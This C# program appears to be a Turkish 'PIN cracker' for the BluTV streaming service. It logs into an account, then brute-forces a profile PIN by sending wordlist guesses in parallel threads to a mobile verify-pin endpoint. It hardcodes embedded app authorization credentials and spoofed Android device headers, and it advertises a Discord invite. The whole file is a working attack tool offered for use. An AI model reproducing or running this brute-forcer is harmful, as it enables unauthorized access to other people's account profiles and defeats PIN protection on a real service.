using RuriLib.Parallelization;
using RuriLib.Parallelization.Models;
using RuriLib.Proxies;
using RuriLib.Proxies.Clients;
using RuriLib.Http; //Thanks to ruri https://github.com/openbullet/OpenBullet2 //
using RuriLib.Http.Models;
using System.Text;
using Parsing;
using Result1;

namespace Recoo
{

    class Program
    {
        public static string email = "";
        public static string password = "";
        public static IEnumerable<string> wordlist = null;
        public static int threadnumber = 0;
        public static string profilid = "";
        private static Parallelizer<string, Result> parallelizer = null;
        public static int bad = 0;
        public static int check = 0;


        private static void Update() // Console title'ı güncelle
        {
            Console.Title = string.Format("Blu-Tv Pin Kirici  -  Progress: {0}/{1}", new Object[]
            {
                check,
                wordlist.Count(),
            });
        }
        static void Main(string[] args)
        {

            Console.ForegroundColor = ConsoleColor.Magenta; // Renkleri mor yap //
            Console.WriteLine(@"
                                                   (                    
                                                   )\ )                 
                                                  (()/(  (              
                                                   /(_))))\ (  (    (   
                                                  (_)) /((_))\ )\   )\  
                                                  | _ (_)) ((_|(_) ((_) 
                                                  |   / -_) _/ _ \/ _ \ 
                                                  |_|_\___\__\___/\___/ 
                      
");
            wordlist = File.ReadLines("superim.txt");
            Console.WriteLine("Email: "); email = Console.ReadLine();

            Console.WriteLine("Password: "); password = Console.ReadLine();

            Console.WriteLine("Profil ID: "); profilid = Console.ReadLine();

            Console.WriteLine("Bots: "); threadnumber = Convert.ToInt32(Console.ReadLine());

            Console.Clear(); // Consolu temizle //
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine(@"
                                                   (                    
                                                   )\ )                 
                                                  (()/(  (              
                                                   /(_))))\ (  (    (   
                                                  (_)) /((_))\ )\   )\  
                                                  | _ (_)) ((_|(_) ((_) 
                                                  |   / -_) _/ _ \/ _ \ 
                                                  |_|_\___\__\___/\___/ 
                      
");
            _ = MainAsync(args);
            Console.ReadLine();
        }

        static async Task MainAsync(string[] args)
        {
            var settings = new ProxySettings();
            var proxyClient = new NoProxyClient(settings);
            using var client = new RLHttpClient(proxyClient); // Http Request ayarları //
            using var request = new HttpRequest
            {
                Uri = new Uri("https://www.blutv.com/api/login"), // Login Post Ayarları //
                Method = HttpMethod.Post,
                Headers = new Dictionary<string, string>
                {
                        {"Host", "www.blutv.com"},
                        {"User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0"},
                        {"Accept", "*/*"},
                        {"Accept-Language", "en-US},en;q=0.5"},
                        {"Accept-Encoding", "gzip}, deflate"},
                        {"Referer", "https://www.blutv.com/giris"},
                        {"Applanguage", "tr-TR"},
                        {"Appplatform", "com.blu"},
                        {"Appcountry", "TUR"},
                        {"Deviceresolution", "1920x1080"},
                        {"Content-Type", "text/plain;charset=UTF-8"},
                        {"X-Instana-T", "f22506a13060ad43"},
                        {"X-Instana-S", "f22506a13060ad43"},
                        {"X-Instana-L", "1},correlationType=web;correlationId=f22506a13060ad43"},
                        {"Origin", "https://www.blutv.com"},
                        {"Sec-Fetch-Dest", "empty"},
                        {"Sec-Fetch-Mode", "cors"},
                        {"Sec-Fetch-Site", "same-origin"},
                        {"Te", "trailers"},
                },

                // Post Data //
                Content = new StringContent($"{{\"remember\":false,\"username\":\"{email}\",\"password\":\"{password}\",\"captchaVersion\":\"v3\",\"captchaToken\":\"\"}}", Encoding.UTF8, "text/plain")
            };
            Update();
            // Send the request //
            using var response = await client.SendAsync(request);

            // Read response //
            var content = await response.Content.ReadAsStringAsync();


            if (content.Contains("accessToken")) // Hesabı Kontrol Et //
            {
                Console.WriteLine("Pin Kırma Işlemi Başlıyor | .gg/Xd8VfYPHB3 "); // Hesap Doğru ise çalışacak kodlar //
                string access = LRParser.ParseBetween(content, "{\"accessToken\":\"", "\",\"refreshToken\":\"").FirstOrDefault(); // Parse accesstoken //
                Func<string, CancellationToken, Task<Result>> parityCheck = new(async (number, token) => // Thread Function'u
                {

                    var settings = new ProxySettings();
                    var proxyClient = new NoProxyClient(settings);
                    var pin = number.Split(":")[0];
                    var result = new Result();

                    using var client = new RLHttpClient(proxyClient);
                    using var request = new HttpRequest
                    {
                        Uri = new Uri($"https://adapter.blupoint.io/api/projects/5d2dc68a92f3636930ba6466/mobile/profiles/verify-pin?profileId={profilid}"), // Pin doğrulama urlsi //
                        Method = HttpMethod.Post,
                        Headers = new Dictionary<string, string> // Head Kısmı //
                        {
                        { "Accept-Encoding", "gzip" },
                        { "Accept-Language", "tr-TR" },
                        { "AppAuthorization", "Basic 58b402bc058d029c8092da50:naEBANIWWu4LGvr82umVCDezA/KJep50+Km7ojdR0ROw2RlKy7a5OBauWzNOV5/TX2pREy1Sc/sg2TwLUdFfcQ==" },
                        { "AppPlatform", "com.blu.lama.phone.android" },
                        { "AppVersion", "62124541" },
                        { "Authorization", "Basic 5d36e6c40780020024687002:cE8vwiQrAULRGZ6ZqqXgtztqFgWRU7o6" },
                        { "AuthorizationToken", access },
                        { "CaptchaProvider", "" },
                        { "CaptchaToken", "" },
                        { "captchaTokenRequired", "false" },
                        { "Content-Type", "application/json; charset=UTF-8" },
                        { "DeviceId", "1c99d003ff548e09" },
                        { "DeviceName", "Samsung SM-G991B" },
                        { "DeviceResolution", "1080x2176" },
                        { "Host", "adapter.blupoint.io" },
                        { "User-Agent", "okhttp/3.12.12" },
                        { "x-captcha-api-version", "v2" },
                        { "X-INSTANA-ANDROID", "e26ca567-c081-41ac-a005-17361fdaa6a1" },
                        },

                        // Post data //
                        Content = new StringContent($"{{\"pin\":\"{pin}\",\"user_id\":\"\"}}", Encoding.UTF8, "application/json")
                    };

                    // Send the request //
                    using var response = await client.SendAsync(request);

                    // Read response //
                    var content = await response.Content.ReadAsStringAsync();
                    if (content.Contains("errors.invalidPinError")) // Keycheck //
                    {
                        result.Pin = pin;
                        result.Status = Status.Bad;
                    }
                    else if (content.Contains("authorizationtoken")) // Pin doğru ise çalışacak blok //
                    {
                        await Task.Delay(4000, token);
                        using var response1 = await client.SendAsync(request); // Yanlış pin vermemesi için tekrar kontrol //
                        var content1 = await response1.Content.ReadAsStringAsync();
                        if (content1.Contains("authorizationtoken")) // Doğru ise //
                        {
                            result.Pin = pin;

                            result.Status = Status.Good;
                        }
                        else // Doğru Değilse //
                        {
                            result.Pin = pin;
                            result.Status = Status.Bad;
                        }
                    }
                    else
                    {
                        Console.WriteLine("Error");
                    }
                    return result; // Sonucu döndür //
                });

                    parallelizer = ParallelizerFactory<string, Result>.Create( // Thread ayarları //
                    type: ParallelizerType.TaskBased,
                    workItems: wordlist,
                    workFunction: parityCheck,
                    degreeOfParallelism: threadnumber,
                    totalAmount: 9999,
                    skip: 0);


                parallelizer.NewResult += OnResult;
                parallelizer.Completed += OnCompleted;
                parallelizer.Error += OnException;
                parallelizer.TaskError += OnTaskError;

                await parallelizer.Start(); // Thread Start //
                var cts = new CancellationTokenSource();
                cts.CancelAfter(10000);

                await parallelizer.WaitCompletion(cts.Token);
            }


        }

        private static void OnResult(object sender, ResultDetails<string, Result> value)
        {
            if (value.Result.Status == Status.Good)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"[PIN-BULUNDU] Pin:{value.Result.Pin}"); // Pin doğru ise Print Atıyor //
                parallelizer.Stop();
            }
            else if (value.Result.Status == Status.Bad) // Değil ise bad ve check'i yükseltiyor //
            {
                Interlocked.Increment(ref bad);
                Interlocked.Increment(ref check);                
            }
            Update();
        }

        private static void OnCompleted(object sender, EventArgs e) => Console.WriteLine("Check Tamamlandı | Pini bulamadı ise gg./Xd8VfYPHB3");
        private static void OnTaskError(object sender, ErrorDetails<string> details)
            => Console.WriteLine($"Error {details.Exception.Message} : {details.Item}");
        private static void OnException(object sender, Exception ex) => Console.WriteLine($"Exception: {ex.Message}");


    }
}
